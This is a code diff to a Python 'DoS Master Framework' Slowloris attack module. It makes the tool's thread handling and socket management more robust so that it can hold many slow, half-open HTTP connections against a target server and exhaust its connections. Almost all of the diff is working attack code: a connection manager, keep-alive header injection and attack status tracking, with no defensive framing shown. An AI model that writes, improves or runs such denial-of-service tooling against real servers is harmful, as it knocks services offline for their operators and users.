@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-DoS Master Framework - Slowloris Attack Module
-Professional Slowloris implementation for connection exhaustion
+DoS Master Framework - Slowloris Attack Module - FIXED VERSION
+Professional Slowloris implementation for connection exhaustion with proper thread management
 """
 
 import socket
@@ -44,6 +44,7 @@ class Slowloris:
         self.connections_maintained = 0
         self.attack_active = False
         self.start_time = None
+        self.socket_lock = threading.Lock()  # Thread-safe socket management
         
     def validate_config(self) -> bool:
         """Validate attack configuration"""
@@ -83,15 +84,24 @@ class Slowloris:
         try:
             # Start connection manager
             manager_thread = threading.Thread(target=self._manage_connections)
+            manager_thread.daemon = True
             manager_thread.start()
             
             # Start keep-alive sender
             keepalive_thread = threading.Thread(target=self._send_keep_alives)
+            keepalive_thread.daemon = True
             keepalive_thread.start()
             
             # Wait for completion or timeout
-            manager_thread.join()
-            keepalive_thread.join()
+            start_time = time.time()
+            while self.attack_active and (time.time() - start_time) < self.duration:
+                time.sleep(1)
+            
+            self.attack_active = False
+            
+            # Wait for threads to finish
+            manager_thread.join(timeout=5)
+            keepalive_thread.join(timeout=5)
             
             # Calculate results
             end_time = time.time()
@@ -165,34 +175,42 @@ class Slowloris:
         
         while self.attack_active and (time.time() - self.start_time) < self.duration:
             try:
-                # Remove dead connections
-                active_sockets = []
-                for sock in self.active_sockets:
-                    try:
-                        # Test if socket is still alive
-                        sock.getpeername()
-                        active_sockets.append(sock)
-                    except:
-                        # Socket is dead, close it
+                with self.socket_lock:
+                    # Remove dead connections
+                    active_sockets = []
+                    for sock in self.active_sockets:
                         try:
-                            sock.close()
+                            # Test if socket is still alive
+                            sock.getpeername()
+                            active_sockets.append(sock)
                         except:
-                            pass
+                            # Socket is dead, close it
+                            try:
+                                sock.close()
+                            except:
+                                pass
+                    
+                    self.active_sockets = active_sockets
+                    self.connections_maintained = len(self.active_sockets)
+                    
+                    # Create new connections to reach target
+                    connections_needed = self.max_connections - len(self.active_sockets)
                 
-                self.active_sockets = active_sockets
-                self.connections_maintained = len(self.active_sockets)
-                
-                # Create new connections to reach target
-                connections_needed = self.max_connections - len(self.active_sockets)
-                
+                # Create connections outside the lock to avoid blocking keep-alive
+                new_sockets = []
                 for _ in range(min(connections_needed, 10)):  # Create max 10 per cycle
                     if not self.attack_active:
                         break
                         
                     sock = self._create_connection()
                     if sock:
-                        self.active_sockets.append(sock)
+                        new_sockets.append(sock)
                         time.sleep(0.1)  # Small delay between connections
+                
+                # Add new sockets to the list
+                if new_sockets:
+                    with self.socket_lock:
+                        self.active_sockets.extend(new_sockets)
                 
                 # Log status
                 elapsed = time.time() - self.start_time
@@ -214,10 +232,14 @@ class Slowloris:
         
         while self.attack_active:
             try:
+                # Get a copy of active sockets to avoid blocking
+                with self.socket_lock:
+                    sockets_to_check = list(self.active_sockets)
+                
                 # Send keep-alive to all active connections
                 dead_sockets = []
                 
-                for sock in self.active_sockets[:]:  # Copy list to avoid modification during iteration
+                for sock in sockets_to_check:
                     try:
                         # Send random header to keep connection alive
                         header = f"X-Random-{random.randint(1, 10000)}: {random.randint(1, 10000)}\r\n"
@@ -229,13 +251,15 @@ class Slowloris:
                         self.logger.debug(f"Socket died during keep-alive: {e}")
                 
                 # Remove dead sockets
-                for sock in dead_sockets:
-                    if sock in self.active_sockets:
-                        self.active_sockets.remove(sock)
-                    try:
-                        sock.close()
-                    except:
-                        pass
+                if dead_sockets:
+                    with self.socket_lock:
+                        for sock in dead_sockets:
+                            if sock in self.active_sockets:
+                                self.active_sockets.remove(sock)
+                            try:
+                                sock.close()
+                            except:
+                                pass
                 
                 # Wait for next keep-alive cycle
                 time.sleep(self.keep_alive_interval)
@@ -246,15 +270,16 @@ class Slowloris:
     
     def _cleanup_connections(self):
         """Close all active connections"""
-        self.logger.info(f"Cleaning up {len(self.active_sockets)} connections")
-        
-        for sock in self.active_sockets:
-            try:
-                sock.close()
-            except:
-                pass
-        
-        self.active_sockets.clear()
+        with self.socket_lock:
+            self.logger.info(f"Cleaning up {len(self.active_sockets)} connections")
+            
+            for sock in self.active_sockets:
+                try:
+                    sock.close()
+                except:
+                    pass
+            
+            self.active_sockets.clear()
     
     def _simulate_attack(self) -> Dict[str, Any]:
         """Simulate attack for dry-run mode"""
@@ -285,11 +310,14 @@ class Slowloris:
         """Get current attack status"""
         elapsed = time.time() - self.start_time if self.start_time else 0
         
+        with self.socket_lock:
+            active_connections = len(self.active_sockets)
+        
         return {
             'attack_type': 'slowloris',
             'active': self.attack_active,
             'elapsed_time': elapsed,
-            'active_connections': len(self.active_sockets),
+            'active_connections': active_connections,
             'connections_created': self.connections_created,
             'target_connections': self.max_connections
         }
